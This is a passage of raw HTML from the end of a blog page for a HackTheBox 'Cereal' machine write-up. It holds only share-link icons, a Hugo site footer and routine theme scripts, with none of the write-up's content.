href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fcereal%2f&title=HackTheBox%20-%20Cereal%20%28User%29&summary=HackTheBox%20-%20Cereal%20%28User%29&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fcereal%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Cereal (User) on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fcereal%2f&title=HackTheBox%20-%20Cereal%20%28User%29"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Cereal (User) on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fcereal%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Cereal (User) on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Cereal%20%28User%29%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fcereal%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Cereal (User) on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Cereal%20%28User%29&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fcereal%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>